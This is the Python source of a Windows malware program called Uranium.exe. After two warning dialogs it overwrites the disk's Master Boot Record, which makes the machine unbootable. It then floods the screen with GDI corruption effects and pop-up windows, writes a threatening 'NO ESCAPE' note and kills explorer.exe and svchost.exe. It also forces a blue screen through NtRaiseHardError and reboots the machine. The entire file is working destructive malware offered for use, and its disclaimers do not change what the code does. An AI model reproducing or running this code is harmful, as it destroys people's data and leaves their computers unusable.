### copyright (c) HobbySoftwareDeveloper 2023-2024
### source code

from win32con import *
from win32ui import *
from win32gui import *
from win32api import *
from win32file import *
from random import *
import os
from random import randint
from win32api import *
from win32con import *
from win32gui import *
from win32file import *
from win32ui import *
from win32gui import GetDC, PatBlt
from random import randrange
from random import randrange as rd
import win32gui
import win32con
import threading
import time
import ctypes
import tkinter as tk
import random
import win32api
from ctypes import POINTER, byref, c_int, c_uint, c_ulong, windll
import shutil

###create boxes

def dow():
    IconError = LoadIcon(None, 32513)
    window = tk.Tk()
    width = window.winfo_screenwidth()
    height = window.winfo_screenheight()
    a = random.randrange(0, width)
    b = random.randrange(0, height)
    window.title('URANIUM')
    window.geometry ("200x100" + "+" + str(a) + "+" + str(b)) 
    tk.Label(window,
            text = 'RUN AWAY',
            font=('courier new',14),
            width=15, height=17,
            ).pack()
    window.mainloop()

###create messageboxes

def dow2():
    MessageBox("Uranium is terminating your system...", "URANIUM.EXE", MB_OK | MB_ICONERROR)

###variables
    
IconWarning = LoadIcon(None, 32515)
IconError = LoadIcon(None, 32513)
IconQuestion = LoadIcon(None, 32514)

sw = win32gui.GetDC(0)
sh = win32gui.GetDC(0)
desk = win32gui.GetDC(0)

hdc = win32gui.GetDC(0)
HDC = win32gui.GetDC(0)
desk = win32gui.GetDC(0)
dc = win32gui.GetDC(0)
w = GetSystemMetrics(SM_CXSCREEN)
h = GetSystemMetrics(SM_CYSCREEN)
sw, sh = GetDeviceCaps(hdc, win32con.DESKTOPHORZRES),GetDeviceCaps(hdc, win32con.DESKTOPVERTRES)
x,y = GetDeviceCaps(hdc, win32con.DESKTOPHORZRES),GetDeviceCaps(hdc, win32con.DESKTOPVERTRES)


w = GetDeviceCaps(hdc, win32con.DESKTOPHORZRES)
h = GetDeviceCaps(hdc, win32con.DESKTOPVERTRES)
a = GetSystemMetrics(SM_CXSCREEN)
b = GetSystemMetrics(SM_CYSCREEN)
sw = GetDeviceCaps(hdc, win32con.DESKTOPHORZRES)
sh = GetDeviceCaps(hdc, win32con.DESKTOPVERTRES)
x = GetDeviceCaps(hdc, win32con.DESKTOPHORZRES)
y = GetDeviceCaps(hdc, win32con.DESKTOPVERTRES)
i = 0
i < 1900
z=rd(50)
hwnd = win32gui.GetDC(0)

###gdi effects

def a():
    for i in range(100):
        brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
        SelectObject(desk,brush)
        PatBlt(desk,0,0,x,y,PATINVERT)
        BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
        BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY) 
        BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
        BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY) 
        DrawIcon(hdc, 8*i, 8*i, IconError)
        PatBlt(desk,0,0,x,y,PATINVERT)
        DrawIcon(hdc, rd(x), rd(y), IconWarning)
        DrawIcon(hdc, rd(x), rd(y), IconQuestion)
        Sleep(100)

                    
def b():
    for i in range(500):
        x1 = rd(x-100)
        y1 = rd(y-100)
        x2 = rd(x-100)
        y2 = rd(y-100)
        width = rd(600)
        height = rd(600)  
        BitBlt(HDC, x1, y1, width, height, HDC, x2, y2, SRCCOPY)
        Sleep(1)  


def c():
	for i in range(1000000):
		x,y = GetCursorPos()
		newX = x + (rd(3)-1)
		newY = y + (rd(3)-1)
		SetCursorPos((newX,newY))


def d():
    for i in range(rd(50)):
        brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
        SelectObject(desk,brush)
        BitBlt(desk,0,0,w,h,desk,-5,-5,SRCINVERT)
        BitBlt(desk,0,0,w,h,desk,5,-5,SRCINVERT)
        BitBlt(desk,0,0,w,h,desk,-5,5,SRCINVERT)
        BitBlt(desk,0,0,w,h,desk,5,5,SRCINVERT)


def f():
    for i in range(200):
        brush = CreateSolidBrush(RGB(
        randrange(255), 
        randrange(255), 
        randrange(255)
        ))
        SelectObject(hdc, brush)
        Pie(hdc, randrange(1,x),randrange(1,y),randrange(1,x),randrange(1,y), randrange(1,x),randrange(1,y), randrange(1,x),randrange(1,y) )
def draw_rects(dc, x, y, w, h, count, dx, dy):
    for i in range(count):
        brush = CreateSolidBrush(RGB(
        randrange(255), 
        randrange(255), 
        randrange(255)
        ))
        SelectObject(dc, brush)
        PatBlt(dc, x + i * dx, y + i * dy, w - 2 * i * dx, h - 2 * i * dy, PATINVERT)
def g():
    dc = GetDC(0)
    draw_rects(dc, 100, 100, 250, 250, 13, 10, 10)
    draw_rects(dc, 200, 300, 250, 250, 13, 10, 10)
    draw_rects(dc, 300, 400, 250, 250, 13, 10, 10)
    draw_rects(dc, 400, 500, 250, 250, 13, 10, 10)
    draw_rects(dc, 500, 600, 250, 250, 13, 10, 10)
    draw_rects(dc, 100, 400, 250, 250, 13, 10, 10)
    draw_rects(dc, 100, 400, 250, 250, 20, 10, 10)
    draw_rects(dc, 150, 450, 250, 250, 20, 10, 10)
    draw_rects(dc, 50, 60, 250, 250, 20, 10, 10)
    draw_rects(dc, 30, 40, 250, 250, 20, 10, 10)
    draw_rects(dc, 30, 60, 250, 250, 20, 10, 10)
    draw_rects(dc, 20, 80, 250, 250, 20, 10, 10)
    draw_rects(dc, 111, 110, 250, 250, 13, 10, 10)
    draw_rects(dc, 120, 120, 250, 250, 13, 10, 10)
    draw_rects(dc, 130, 130, 250, 250, 13, 10, 10)
    draw_rects(dc, 140, 140, 250, 250, 13, 10, 10)
    draw_rects(dc, 150, 150, 250, 250, 13, 10, 10)
    draw_rects(dc, 160, 160, 250, 250, 13, 10, 10)
    draw_rects(dc, 180, 120, 250, 250, 13, 10, 10)
    draw_rects(dc, 200, 180, 250, 250, 13, 10, 10)
    draw_rects(dc, 210, 190, 250, 250, 13, 10, 10)
    draw_rects(dc, 220, 200, 250, 250, 13, 10, 10)
    draw_rects(dc, 230, 210, 250, 250, 13, 10, 10)
    draw_rects(dc, 240, 230, 250, 250, 13, 10, 10)
    draw_rects(dc, 250, 240, 250, 250, 13, 10, 10)
    draw_rects(dc, 280, 270, 250, 250, 13, 10, 10)
    draw_rects(dc, 290, 280, 250, 250, 13, 10, 10)
    draw_rects(dc, 300, 300, 250, 250, 13, 10, 10)
    draw_rects(dc, 100, 100, 250, 250, 13, 10, 10)
    draw_rects(dc, 315, 241, 250, 250, 20, 30, 40)
    draw_rects(dc, 100, 430, 250, 250, 20, 30, 40)
    draw_rects(dc, 182, 252, 250, 250, 20, 30, 40)
    draw_rects(dc, 195, 348, 250, 250, 20, 30, 40)
    draw_rects(dc, 175, 520, 250, 250, 20, 30, 40)
    draw_rects(dc, 100, 400, 300, 450, 20, 30, 40)
    draw_rects(dc, 231, 400, 250, 250, 20, 30, 40)
    draw_rects(dc, 100, 400, 250, 250, 300, 30, 40)
    draw_rects(dc, 300, 700, 250, 250, 410, 30, 40)
    draw_rects(dc, 100, 400, 250, 250, 13, 40, 60)
    draw_rects(dc, 100, 400, 250, 250, 13, 60, 80)
    draw_rects(dc, 100, 400, 250, 250, 13, 80, 100)
    draw_rects(dc, 100, 400, 250, 250, 13, 100, 110)
    draw_rects(dc, 100, 400, 250, 250, 13, 300, 400)
    draw_rects(dc, 300, 200, 250, 250, 13, 600, 800)
def j():
    for i in range(20):
        brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
        SelectObject(desk,brush)
        PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)

        PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
        PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
        StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
        StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
        BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
        BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
        StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
        StretchBlt(desk, 0, 0, sw, sh, desk,sw,sh, sw, sh, SRCPAINT)
        BitBlt(desk, i, i, i, i, desk, i, i, NOTSRCCOPY)

        BitBlt(desk,10,10,w,h,desk,90,0,SRCERASE)
        BitBlt(desk,10,10,w,h,desk,0,180,NOTSRCERASE)
        BitBlt(desk,10,10,w,h,desk,0,90,SRCAND)
        BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
        BitBlt(GetDC(NULL), x, y, x,y, GetDC(NULL),x,y, NOTSRCCOPY)
        PatBlt(desk,0,0,x,y,PATINVERT)
        BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
        BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)

        BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
        BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
        DeleteObject(brush)


def l():
    for i in range(100):
        brush = CreateSolidBrush(RGB(
            randrange(255),
            randrange(255),
            randrange(255),
            ))
        SelectObject(desk,brush)
        PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
        StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
        BitBlt(desk,10,10,w,h,desk,12,12,SRCINVERT)
        DeleteObject(brush)

def m():
    for i in range(30):
        for i in range(30):
            brush = CreateSolidBrush(RGB(
                0,0,0
            ))
            SelectObject(desk, brush)
            PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATCOPY)
        brush = CreateSolidBrush(RGB(
            0,255,0
        ))
        SelectObject(desk, brush)
        PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATCOPY)

###write a text document into the pc

def n():
    e = "NO ESCAPE.txt"
    with open('NO ESCAPE.txt', 'w') as f:
        f.write('Your PC has been destroyed by Uranium.exe.\r\nTrying to kill me will not help you.\r\nYou have 66.666 seconds to live and then your PC will die.\r\nEnjoy the last minute with your PC! :D')
    time.sleep(0.5)
    os.startfile(f'{e}')

###show boxes for 50 times

def o():
    threads = []
    for i in range(50):
        t = threading. Thread (target=dow)
        threads.append(t)
        time.sleep(0.000001)
        threads[i].start()

###show messageboxes for 3 times

def q():
    threads = []
    for i in range(3):
        t = threading. Thread (target=dow2)
        threads.append(t)
        time.sleep(1)
        threads[i].start()

###copy error icon from C:\Windows\System32

def p():
    dpath = os.environ["USERPROFILE"] + "/Desktop/"
    for i in range(500):
        shutil.copy(r"C:\windows\system32\securityandmaintenance_error.png", dpath + "DEATH " + str(i) + ".png")
        ctypes.windll.user32.SystemParametersInfoW(20, 0, r"image.jpg", 0)

###owerwrite the Master Boot Record and make the PC unbootable

def overwrite_MBR():
        hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
        WriteFile(hDevice, AllocateReadBuffer(512), None)
        CloseHandle(hDevice)

###try to force a blue screen of death

def crashwindows():

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

###warning

warning = MessageBox("This program you have just excuted is considered malware. It will harm your PC and destroy it.\r\nAll your data will be lost after you start this malware and there will be no escape. Please use a safe environment to test this malware and disconnect any pysical device from the environment. \r\n\r\nDO YOU WANT TO CONTINUE?", "URANIUM.EXE", MB_YESNO | MB_DEFBUTTON2 | MB_ICONWARNING)
if warning == IDYES:
    finalwarning = MessageBox("THIS IS THE LAST WARNING!\r\n\r\nTHE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\nURANIUM WILL START INSTANTLY AFTER YOU PRESSED YES! DO YOU STILL WANT TO EXCUTE IT?", "URANIUM.EXE", MB_YESNO | MB_DEFBUTTON2 | MB_ICONWARNING)
    if finalwarning == IDYES:
        overwrite_MBR()
        a()
        b()
        c()
        o()
        d()
        f()
        g()
        j()
        l()
        m()
        n()
        p()
	time.sleep(66.666)

###kill the explorer to make the desktop disappear

        os.system("taskkill /f /im explorer.exe")
        q()
        crashwindows()
        time.sleep(1)

###if crashwindows() not works, try to kill svchost.exe to force a BSOD

        os.system("taskkill /f /im svchost.exe")
        time.sleep(1)

###if taskkilling svchost dont work, restart the PC.

        os.system("shutdown /r /t 00")

###if you pressed no, exit programm.

else:    
    exit()
